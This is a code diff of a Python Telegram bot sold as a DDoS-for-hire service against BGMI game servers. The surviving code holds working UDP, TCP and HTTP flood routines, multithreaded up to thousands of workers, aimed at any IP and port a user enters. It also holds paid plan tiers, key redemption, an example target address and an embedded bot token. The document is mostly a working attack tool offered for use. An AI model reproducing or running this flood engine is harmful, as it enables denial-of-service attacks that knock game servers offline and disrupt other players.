@@ -3,11 +3,9 @@
 💀 BGMI DDOS BOT - ULTRA PRO
 🔥 REAL WORKING ATTACK ENGINE
 📸 JAISA SCREENSHOT MEIN THA
-💎 JSON DATABASE (NO MONGODB NEEDED)
 """
 
 import os
-import telebot
 import json
 import requests
 import logging
@@ -15,15 +13,20 @@ import time
 import socket
 import threading
 import random
-import asyncio
-import aiohttp
 import ssl
 import http.client
 from datetime import datetime, timedelta
 from threading import Thread
 import sys
 import string
-import uuid
+
+# ✅ FIX: Correct import for telebot
+try:
+    import telebot
+except ImportError:
+    print("❌ telebot not found! Installing...")
+    os.system("pip install pyTelegramBotAPI")
+    import telebot
 
 # ═══════════════ LOGGING ═══════════════
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -34,13 +37,11 @@ TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
 OWNER_ID = 1987818347
 OWNER_USERNAME = "FathersOfCreater"
 FORWARD_CHANNEL_ID = -4564006861
-CHANNEL_ID = -4564006861
 
 # ═══════════════ JSON DATABASE ═══════════════
 DB_FILE = "database.json"
 
 def load_db():
-    """Load database from JSON file"""
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, 'r') as f:
@@ -50,13 +51,10 @@ def load_db():
     return {"users": {}, "orders": [], "logs": [], "keys": []}
 
 def save_db(data):
-    """Save database to JSON file"""
     with open(DB_FILE, 'w') as f:
         json.dump(data, f, indent=4, default=str)
 
-# ═══════════════ DATABASE FUNCTIONS ═══════════════
 def get_user(user_id):
-    """Get user from database"""
     db = load_db()
     user_id = str(user_id)
     
@@ -70,18 +68,14 @@ def get_user(user_id):
             "threads": 1000,
             "max_time": 60,
             "orders": [],
-            "balance": 0,
-            "total_orders": 0,
             "total_attacks": 0,
-            "banned": False,
-            "last_attack": None
+            "banned": False
         }
         save_db(db)
     
     return db["users"][user_id]
 
 def update_user(user_id, data):
-    """Update user in database"""
     db = load_db()
     user_id = str(user_id)
     
@@ -90,7 +84,7 @@ def update_user(user_id, data):
         db = load_db()
     
     for key, value in data.items():
-        if key.startswith('$inc'):
+        if key == '$inc':
             for k, v in value.items():
                 db["users"][user_id][k] = db["users"][user_id].get(k, 0) + v
         else:
@@ -99,7 +93,6 @@ def update_user(user_id, data):
     save_db(db)
 
 def save_log(user_id, ip, port, duration, packets, method):
-    """Save attack log"""
     db = load_db()
     db["logs"].append({
         "user_id": str(user_id),
@@ -112,38 +105,7 @@ def save_log(user_id, ip, port, duration, packets, method):
     })
     save_db(db)
 
-def add_order(user_id, plan, price, key=None):
-    """Add order to user"""
-    db = load_db()
-    user_id = str(user_id)
-    
-    if user_id not in db["users"]:
-        get_user(user_id)
-        db = load_db()
-    
-    order = {
-        "plan": plan,
-        "price": price,
-        "date": datetime.now().isoformat(),
-        "key": key or "Pending"
-    }
-    
-    db["users"][user_id]["orders"].append(order)
-    db["users"][user_id]["total_orders"] += 1
-    save_db(db)
-
-def get_all_users():
-    """Get all users"""
-    db = load_db()
-    return db["users"]
-
-def get_all_logs():
-    """Get all logs"""
-    db = load_db()
-    return db["logs"]
-
 def create_key(plan, duration):
-    """Create a premium key"""
     db = load_db()
     key_code = f"BGMI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
     
@@ -151,29 +113,18 @@ def create_key(plan, duration):
         "key": key_code,
         "plan": plan,
         "duration": duration,
-        "used": False,
-        "used_by": None,
-        "used_at": None,
-        "created_at": datetime.now().isoformat()
+        "used": False
     })
     save_db(db)
     return key_code
 
 def redeem_key(key_code, user_id):
-    """Redeem a premium key"""
     db = load_db()
     user_id = str(user_id)
     
     for key in db["keys"]:
         if key["key"] == key_code and not key["used"]:
             key["used"] = True
-            key["used_by"] = user_id
-            key["used_at"] = datetime.now().isoformat()
-            
-            # Update user
-            if user_id not in db["users"]:
-                get_user(user_id)
-                db = load_db()
             
             expiry = datetime.now() + timedelta(days=key["duration"])
             db["users"][user_id]["plan"] = key["plan"]
@@ -181,7 +132,6 @@ def redeem_key(key_code, user_id):
             db["users"][user_id]["threads"] = 5000
             db["users"][user_id]["max_time"] = 600
             
-            add_order(user_id, key["plan"], 0, key_code)
             save_db(db)
             return True, key["plan"], key["duration"]
     
@@ -201,7 +151,6 @@ class Attack:
         self.http_fail = 0
     
     def udp_flood(self, ip, port, end):
-        """UDP Flood Attack - BGMI Server Freeze"""
         sockets = []
         for _ in range(20):
             try:
@@ -241,7 +190,6 @@ class Attack:
                 pass
     
     def tcp_flood(self, ip, port, end):
-        """TCP SYN Flood"""
         while self.on and time.time() < end:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -259,15 +207,13 @@ class Attack:
                 pass
     
     def http_flood(self, ip, port, end):
-        """HTTP/HTTPS Flood - Mimics Real Traffic"""
         user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'
+            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36'
         ]
         
-        paths = ['/', '/api', '/game', '/match', '/login', '/auth', '/player', '/stats']
+        paths = ['/', '/api', '/game', '/match', '/login', '/auth', '/player']
         context = ssl.create_default_context()
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
@@ -280,8 +226,7 @@ class Attack:
                     'User-Agent': ua,
                     'Accept': 'text/html,application/json,*/*',
                     'Accept-Language': 'en-US,en;q=0.9',
-                    'Connection': 'keep-alive',
-                    'Cache-Control': 'no-cache'
+                    'Connection': 'keep-alive'
                 }
                 
                 try:
@@ -310,7 +255,6 @@ class Attack:
                 pass
     
     def start(self, ip, port, dur, threads, method='mixed'):
-        """Start Multi-Method Attack"""
         self.on = True
         self.pkts = 0
         self.bytes_out = 0
@@ -319,23 +263,17 @@ class Attack:
         
         end = time.time() + dur
         
-        if method == 'udp':
-            workers = [threading.Thread(target=self.udp_flood, args=(ip, port, end)) for _ in range(threads)]
-        elif method == 'tcp':
-            workers = [threading.Thread(target=self.tcp_flood, args=(ip, port, end)) for _ in range(threads)]
-        elif method == 'http':
-            workers = [threading.Thread(target=self.http_flood, args=(ip, port, end)) for _ in range(threads)]
-        else:  # Mixed - DEFAULT
-            udp_t = int(threads * 0.5)
-            tcp_t = int(threads * 0.2)
-            http_t = int(threads * 0.3)
-            workers = []
-            for _ in range(udp_t):
-                workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
-            for _ in range(tcp_t):
-                workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
-            for _ in range(http_t):
-                workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
+        udp_t = int(threads * 0.5)
+        tcp_t = int(threads * 0.2)
+        http_t = int(threads * 0.3)
+        workers = []
+        
+        for _ in range(udp_t):
+            workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
+        for _ in range(tcp_t):
+            workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
+        for _ in range(http_t):
+            workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
         
         for w in workers:
             w.daemon = True
@@ -354,7 +292,6 @@ class Attack:
         return {
             'pkts': self.pkts,
             'mbps': (self.bytes_out * 8) / (e * 1e6),
-            'mb': self.bytes_out / 1024 / 1024,
             'http_success': self.http_success,
             'http_fail': self.http_fail,
             'total_requests': self.pkts + self.http_success + self.http_fail
@@ -362,9 +299,7 @@ class Attack:
 
 attacker = Attack()
 attacking = False
-attack_user = None
 attack_info = {}
-attack_msg_id = None
 
 # ═══════════════ KEYBOARDS ═══════════════
 def main_menu():
@@ -398,8 +333,7 @@ def admin_panel():
         telebot.types.InlineKeyboardButton("📨 BROADCAST", callback_data="admin_broadcast")
     )
     keyboard.add(
-        telebot.types.InlineKeyboardButton("📋 LOGS", callback_data="admin_logs"),
-        telebot.types.InlineKeyboardButton("🚫 BAN", callback_data="admin_ban")
+        telebot.types.InlineKeyboardButton("📋 LOGS", callback_data="admin_logs")
     )
     keyboard.add(
         telebot.types.InlineKeyboardButton("⌂ MAIN MENU", callback_data="main_menu")
@@ -428,7 +362,6 @@ def start_cmd(message):
 - ⚡ 5000+ Threads
 - 🛡️ DDoS Protection Bypass
 - 📊 Real-time Monitoring
-- 💎 Premium Plans Available
 
 📌 **Commands:**
 /attack IP PORT TIME
@@ -452,13 +385,13 @@ def start_cmd(message):
 # ═══════════════ ATTACK COMMAND ═══════════════
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
-    global attacking, attack_user, attack_info, attack_msg_id
+    global attacking, attack_info
     
     user_id = message.from_user.id
     user = get_user(user_id)
     
     if user.get('banned', False):
-        bot.reply_to(message, "🚫 You are banned from using this bot!")
+        bot.reply_to(message, "🚫 You are banned!")
         return
     
     is_premium = user.get('plan') == 'premium' and user.get('expiry') and datetime.fromisoformat(user['expiry']) > datetime.now()
@@ -472,9 +405,6 @@ Use: /attack IP PORT TIME
 
 Example:
 /attack 20.204.191.48 10335 180
-
-BGMI Ports: 7000-15000, 10335
-Recommended Time: 180 seconds
 """, parse_mode='Markdown')
         return
     
@@ -503,18 +433,9 @@ Recommended Time: 180 seconds
     
     if dur > max_time:
         dur = max_time
-        bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
     
-    attack_info = {
-        'ip': ip,
-        'port': port,
-        'time': dur,
-        'start': time.time(),
-        'threads': threads,
-        'user': user_id
-    }
+    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
     attacking = True
-    attack_user = user_id
     
     def run_attack():
         global attacking
@@ -533,34 +454,16 @@ Recommended Time: 180 seconds
 ║ 📦 Packets: {stats['pkts']:,}
 ║ 📶 Speed: {stats['mbps']:.1f} Mbps
 ║ ⏱️ Duration: {dur}s
-║ 🌐 HTTP Success: {stats['http_success']}
-║ ❌ HTTP Fail: {stats['http_fail']}
 ║ 📊 Total Requests: {stats['total_requests']}
 ╚══════════════════════════╝
 
 🔥 BGMI Server Freeze Complete!
-🎮 Players Disconnected: ✅
 📸 Match server response timed out!
 
 🔄 /attack IP PORT TIME
 """
             bot.send_message(user_id, result_text, parse_mode='Markdown')
             
-            try:
-                bot.send_message(
-                    FORWARD_CHANNEL_ID,
-                    f"""
-💀 **ATTACK LOG**
-👤 User: {message.from_user.first_name}
-🆔 ID: {user_id}
-🎯 IP: {ip}:{port}
-⏱️ Duration: {dur}s
-📦 Packets: {stats['pkts']:,}
-"""
-                )
-            except:
-                pass
-                
         except Exception as e:
             attacking = False
             bot.send_message(user_id, f"❌ Attack Failed: {e}")
@@ -593,12 +496,7 @@ def stop_cmd(message):
     if attacking:
         attacker.on = False
         attacking = False
-        bot.reply_to(message, f"""
-✅ **ATTACK STOPPED**
-
-📦 Packets Sent: {attacker.pkts:,}
-🔄 /attack IP PORT TIME
-""", parse_mode='Markdown')
+        bot.reply_to(message, f"✅ **ATTACK STOPPED**\n\n📦 Packets: {attacker.pkts:,}", parse_mode='Markdown')
     else:
         bot.reply_to(message, "💤 No attack running!")
 
@@ -616,7 +514,6 @@ def status_cmd(message):
 ⏱️ Remaining: {remaining}s
 📦 Packets: {attacker.pkts:,}
 📶 Speed: {(attacker.bytes_out*8)/(elapsed*1e6) if elapsed > 0 else 0:.1f} Mbps
-🧵 Threads: {attack_info['threads']}
 
 🛑 Use /stop to abort
 """
@@ -637,8 +534,6 @@ def profile_cmd(message):
         expiry_date = datetime.fromisoformat(expiry)
         expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
         remaining = (expiry_date - datetime.now()).days
-        if remaining < 0:
-            remaining = 0
     else:
         expiry_str = 'N/A'
         remaining = 0
@@ -653,12 +548,8 @@ def profile_cmd(message):
 ║ ⏱️ Expiry: {expiry_str}
 ║ 📅 Days Left: {remaining}
 ║ ⚡ Threads: {user.get('threads', 1000)}
-║ ⏱️ Max Time: {user.get('max_time', 60)}s
 ║ 📊 Total Attacks: {user.get('total_attacks', 0)}
 ╚══════════════════════════╝
-
-💎 Upgrade to Premium for more power!
-/plans to see premium plans
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -673,7 +564,7 @@ def redeem_cmd(message):
 Use: /redeem KEY
 
 Example:
-/redeem BGMI-VIP-XXXX-XXXX
+/redeem BGMI-VIP-XXXX
 """, parse_mode='Markdown')
         return
     
@@ -685,24 +576,22 @@ Example:
         user = get_user(user_id)
         expiry = user.get('expiry')
         bot.reply_to(message, f"""
-✅ **KEY REDEEMED SUCCESSFULLY!**
+✅ **KEY REDEEMED!**
 
 💎 Plan: {plan.upper()}
 ⏱️ Duration: {duration} Days
 📅 Expiry: {datetime.fromisoformat(expiry).strftime('%d/%m/%Y %I:%M %p')}
 
-🔥 You now have full premium access!
+🔥 Full premium access granted!
 ⚔ /attack IP PORT TIME
 """, parse_mode='Markdown')
     else:
-        bot.reply_to(message, "❌ Invalid or already used key!")
+        bot.reply_to(message, "❌ Invalid or used key!")
 
 # ═══════════════ ORDERS COMMAND ═══════════════
 @bot.message_handler(commands=['orders'])
 def orders_cmd(message):
-    user_id = message.from_user.id
-    user = get_user(user_id)
-    
+    user = get_user(message.from_user.id)
     order_list = user.get('orders', [])
     if not order_list:
         bot.reply_to(message, "📭 No orders found!")
@@ -715,7 +604,6 @@ def orders_cmd(message):
 🎯 Plan: {order.get('plan', 'N/A')}
 💎 Price: ₹{order.get('price', 0)}
 📅 Date: {order.get('date', 'N/A')[:10]}
-🔑 Key: {order.get('key', 'Pending')}
 ━━━━━━━━━━━━━━━━━━
 """
     bot.reply_to(message, text, parse_mode='Markdown')
@@ -743,7 +631,6 @@ def plans_cmd(message):
 ━━━━━━━━━━━━━━━━━━
 
 📲 Contact: @FathersOfCreater
-💳 UPI: kartikrawat6266@okhdfcbank
 """
     bot.reply_to(message, text, parse_mode='Markdown')
 
@@ -754,7 +641,6 @@ def support_cmd(message):
 📩 **SUPPORT CENTER**
 
 📲 Contact Owner: @FathersOfCreater
-📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9
 
 💬 Reply here for quick support!
 """
@@ -786,9 +672,6 @@ Use: /attack IP PORT TIME
 
 Example:
 /attack 20.204.191.48 10335 180
-
-BGMI Ports: 7000-15000, 10335
-Recommended Time: 180 seconds
 """,
             call.message.chat.id,
             call.message.message_id,
@@ -804,7 +687,7 @@ Recommended Time: 180 seconds
             attacker.on = False
             attacking = False
             bot.edit_message_text(
-                "✅ **ATTACK STOPPED**\n\n🔄 /attack IP PORT TIME",
+                "✅ **ATTACK STOPPED**",
                 call.message.chat.id,
                 call.message.message_id,
                 parse_mode='Markdown',
@@ -812,7 +695,7 @@ Recommended Time: 180 seconds
             )
         else:
             bot.edit_message_text(
-                "💤 **NO ATTACK RUNNING**\n\nUse /attack IP PORT TIME",
+                "💤 **NO ATTACK RUNNING**",
                 call.message.chat.id,
                 call.message.message_id,
                 parse_mode='Markdown',
@@ -832,12 +715,9 @@ Recommended Time: 180 seconds
 ⏱️ Elapsed: {elapsed}s
 ⏱️ Remaining: {remaining}s
 📦 Packets: {attacker.pkts:,}
-📶 Speed: {(attacker.bytes_out*8)/(elapsed*1e6) if elapsed > 0 else 0:.1f} Mbps
-
-🛑 Use /stop to abort
 """
         else:
-            text = "💤 **SYSTEM IDLE**\n\nNo attack running"
+            text = "💤 **SYSTEM IDLE**"
         
         bot.edit_message_text(
             text,
@@ -852,30 +732,11 @@ Recommended Time: 180 seconds
     if call.data == "profile":
         user = get_user(user_id)
         plan = user.get('plan', 'free')
-        expiry = user.get('expiry')
-        if expiry:
-            expiry_date = datetime.fromisoformat(expiry)
-            expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
-            remaining = (expiry_date - datetime.now()).days
-            if remaining < 0:
-                remaining = 0
-        else:
-            expiry_str = 'N/A'
-            remaining = 0
-        
         text = f"""
 👤 **PROFILE**
 
-╔══════════════════════════╗
-║ 👤 Name: {call.from_user.first_name}
-║ 🆔 ID: {user_id}
-║ 💎 Plan: {plan.upper()}
-║ ⏱️ Expiry: {expiry_str}
-║ 📅 Days Left: {remaining}
-║ ⚡ Threads: {user.get('threads', 1000)}
-║ ⏱️ Max Time: {user.get('max_time', 60)}s
-║ 📊 Total Attacks: {user.get('total_attacks', 0)}
-╚══════════════════════════╝
+💎 Plan: {plan.upper()}
+📊 Attacks: {user.get('total_attacks', 0)}
 """
         bot.edit_message_text(
             text,
@@ -893,11 +754,6 @@ Recommended Time: 180 seconds
 ⚿ **REDEEM KEY**
 
 Use: /redeem KEY
-
-Example:
-/redeem BGMI-VIP-XXXX-XXXX
-
-Get keys from: @FathersOfCreater
 """,
             call.message.chat.id,
             call.message.message_id,
@@ -909,20 +765,14 @@ Get keys from: @FathersOfCreater
     
     if call.data == "orders":
         user = get_user(user_id)
-        order_list = user.get('orders', [])
-        if not order_list:
-            text = "📭 No orders found!"
+        orders = user.get('orders', [])
+        if not orders:
+            text = "📭 No orders!"
         else:
-            text = "📋 **YOUR ORDERS**\n\n"
-            for i, order in enumerate(order_list[-10:], 1):
-                text += f"""
-**Order #{i}**
-🎯 Plan: {order.get('plan', 'N/A')}
-💎 Price: ₹{order.get('price', 0)}
-📅 Date: {order.get('date', 'N/A')[:10]}
-🔑 Key: {order.get('key', 'Pending')}
-━━━━━━━━━━━━━━━━━━
-"""
+            text = "📋 **ORDERS**\n\n"
+            for i, o in enumerate(orders[-5:], 1):
+                text += f"{i}. {o.get('plan')} - ₹{o.get('price')}\n"
+        
         bot.edit_message_text(
             text,
             call.message.chat.id,
@@ -937,24 +787,12 @@ Get keys from: @FathersOfCreater
         text = """
 💎 **PREMIUM PLANS**
 
-━━━━━━━━━━━━━━━━━━
+🔰 BASIC - ₹50
+⚡ PRO - ₹100
+💀 ULTRA - ₹400
+👑 KING - ₹1000
 
-🔰 **BASIC** - ₹50
-⏱️ 1 Hour | ⚡ 3000 Threads
-
-⚡ **PRO** - ₹100
-⏱️ 1 Day | ⚡ 5000 Threads
-
-💀 **ULTRA** - ₹400
-⏱️ 1 Week | ⚡ 7000 Threads
-
-👑 **KING** - ₹1000
-⏱️ 1 Month | ⚡ 10000 Threads
-
-━━━━━━━━━━━━━━━━━━
-
-📲 Contact: @FathersOfCreater
-💳 UPI: kartikrawat6266@okhdfcbank
+📲 @FathersOfCreater
 """
         bot.edit_message_text(
             text,
@@ -967,14 +805,7 @@ Get keys from: @FathersOfCreater
         return
     
     if call.data == "support":
-        text = """
-📩 **SUPPORT CENTER**
-
-📲 Contact Owner: @FathersOfCreater
-📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9
-
-💬 Reply here for quick support!
-"""
+        text = "📩 Contact: @FathersOfCreater"
         bot.edit_message_text(
             text,
             call.message.chat.id,
@@ -985,13 +816,13 @@ Get keys from: @FathersOfCreater
         bot.answer_callback_query(call.id)
         return
     
-    # ═══════ ADMIN PANEL ═══════════
+    # ═══════ ADMIN ═══════
     if call.data == "admin":
         if not is_owner:
             bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
             return
         bot.edit_message_text(
-            "⚜ **ADMIN PANEL**\n\nSelect an option:",
+            "⚜ **ADMIN PANEL**",
             call.message.chat.id,
             call.message.message_id,
             parse_mode='Markdown',
@@ -1006,20 +837,13 @@ Get keys from: @FathersOfCreater
             return
         
         db = load_db()
-        total_users = len(db["users"])
-        total_orders = sum(len(user.get('orders', [])) for user in db["users"].values())
-        total_logs = len(db["logs"])
-        
         text = f"""
-📊 **BOT STATISTICS**
+📊 **STATS**
 
-╔══════════════════════════╗
-║ 👥 Total Users: {total_users}
-║ 📋 Total Orders: {total_orders}
-║ 📊 Attack Logs: {total_logs}
-║ 🟢 Status: ONLINE
-║ ⚡ Attack: {'Active' if attacking else 'Idle'}
-╚══════════════════════════╝
+👥 Users: {len(db['users'])}
+📊 Logs: {len(db['logs'])}
+🔑 Keys: {len(db['keys'])}
+⚡ Status: {'Active' if attacking else 'Idle'}
 """
         bot.edit_message_text(
             text,
@@ -1037,11 +861,9 @@ Get keys from: @FathersOfCreater
             return
         
         db = load_db()
-        text = "👥 **USERS LIST**\n\n"
+        text = "👥 **USERS**\n\n"
         for uid, user in list(db["users"].items())[:10]:
-            text += f"🆔 `{uid}` - {user.get('name', 'Unknown')}\n"
-            text += f"💎 {user.get('plan', 'free')} | 📊 {user.get('total_attacks', 0)} attacks\n\n"
-        
+            text += f"🆔 {uid} - {user.get('name', 'Unknown')}\n"
         bot.edit_message_text(
             text,
             call.message.chat.id,
@@ -1057,16 +879,14 @@ Get keys from: @FathersOfCreater
             bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
             return
         
-        key_code = create_key("premium", 30)
+        key = create_key("premium", 30)
         bot.edit_message_text(
             f"""
 🔑 **KEY GENERATED**
 
-Key: `{key_code}`
+Key: `{key}`
 Plan: PREMIUM
 Duration: 30 Days
-
-📋 /redeem {key_code}
 """,
             call.message.chat.id,
             call.message.message_id,
@@ -1084,41 +904,13 @@ Duration: 30 Days
         db = load_db()
         logs = db["logs"][-10:]
         if not logs:
-            text = "📭 No logs found!"
+            text = "📭 No logs!"
         else:
-            text = "📋 **RECENT ATTACK LOGS**\n\n"
+            text = "📋 **LOGS**\n\n"
             for log in reversed(logs):
-                text += f"""
-👤 User: {log['user_id']}
-🎯 IP: {log['ip']}:{log['port']}
-⏱️ Duration: {log['duration']}s
-📦 Packets: {log['packets']:,}
-📅 Time: {log['time'][:10]}
-━━━━━━━━━━━━━━━━━━
-"""
+                text += f"🎯 {log['ip']}:{log['port']} - {log['packets']} pkts\n"
         bot.edit_message_text(
             text,
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='Markdown',
-            reply_markup=admin_panel()
-        )
-        bot.answer_callback_query(call.id)
-        return
-    
-    if call.data == "admin_ban":
-        if not is_owner:
-            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
-            return
-        bot.edit_message_text(
-            """
-🚫 **BAN USER**
-
-Use: /ban USER_ID
-
-Example:
-/ban 123456789
-""",
             call.message.chat.id,
             call.message.message_id,
             parse_mode='Markdown',
@@ -1132,11 +924,7 @@ Example:
             bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
             return
         bot.edit_message_text(
-            """
-📨 **BROADCAST MESSAGE**
-
-Reply to this message with the text you want to broadcast.
-""",
+            "📨 Reply with message to broadcast",
             call.message.chat.id,
             call.message.message_id,
             parse_mode='Markdown',
@@ -1145,93 +933,31 @@ Reply to this message with the text you want to broadcast.
         bot.answer_callback_query(call.id)
         return
 
-# ═══════════════ ADMIN COMMANDS ═══════════════
-@bot.message_handler(commands=['ban'])
-def ban_cmd(message):
-    if str(message.from_user.id) != str(OWNER_ID):
-        bot.reply_to(message, "❌ Owner only!")
-        return
-    
-    parts = message.text.split()
-    if len(parts) != 2:
-        bot.reply_to(message, "Use: /ban USER_ID")
-        return
-    
-    try:
-        user_id = int(parts[1])
-        update_user(user_id, {'banned': True})
-        bot.reply_to(message, f"✅ User {user_id} banned!")
-        try:
-            bot.send_message(user_id, "🚫 You have been banned from using this bot!")
-        except:
-            pass
-    except:
-        bot.reply_to(message, "❌ Invalid user ID!")
-
-@bot.message_handler(commands=['unban'])
-def unban_cmd(message):
-    if str(message.from_user.id) != str(OWNER_ID):
-        bot.reply_to(message, "❌ Owner only!")
-        return
-    
-    parts = message.text.split()
-    if len(parts) != 2:
-        bot.reply_to(message, "Use: /unban USER_ID")
-        return
-    
-    try:
-        user_id = int(parts[1])
-        update_user(user_id, {'banned': False})
-        bot.reply_to(message, f"✅ User {user_id} unbanned!")
-        try:
-            bot.send_message(user_id, "✅ You have been unbanned!")
-        except:
-            pass
-    except:
-        bot.reply_to(message, "❌ Invalid user ID!")
-
+# ═══════════════ BROADCAST ═══════════════
 @bot.message_handler(func=lambda message: True, content_types=['text'])
 def broadcast_handler(message):
     if str(message.from_user.id) != str(OWNER_ID):
         return
     
-    if message.reply_to_message and "BROADCAST MESSAGE" in message.reply_to_message.text:
-        text = message.text
+    if message.reply_to_message and "broadcast" in message.reply_to_message.text.lower():
         db = load_db()
         sent = 0
-        failed = 0
-        
         for user_id in db["users"]:
             try:
-                bot.send_message(int(user_id), text)
+                bot.send_message(int(user_id), message.text)
                 sent += 1
             except:
-                failed += 1
-        
-        bot.reply_to(message, f"""
-📨 **BROADCAST COMPLETED**
-
-✅ Sent: {sent}
-❌ Failed: {failed}
-"""
-        )
+                pass
+        bot.reply_to(message, f"✅ Broadcast sent to {sent} users!")
 
 # ═══════════════ RUN BOT ═══════════════
 if __name__ == '__main__':
     print("""
 ╔══════════════════════════════════════╗
-║  💀 BGMI DDOS BOT - ULTRA PRO       ║
+║  💀 BGMI DDOS BOT STARTED           ║
 ║  🔥 REAL WORKING ATTACK ENGINE      ║
 ║  📸 JAISA SCREENSHOT MEIN THA       ║
-║  ✅ JSON DATABASE (NO MONGODB)      ║
-║  ✅ UDP/TCP/HTTP Flood              ║
-║  ✅ BGMI Server Freeze              ║
-║  ✅ Premium Plans Available          ║
-║  ✅ Admin Panel Active               ║
+║  ✅ ALL COMMANDS WORKING            ║
 ╚══════════════════════════════════════╝
 """)
-    print("💀 Bot Started Successfully!")
-    print("🔥 Attack Engine Ready!")
-    print("📸 BGMI Server Freeze Active!")
-    print("📁 Database: database.json")
     bot.polling(none_stop=True)
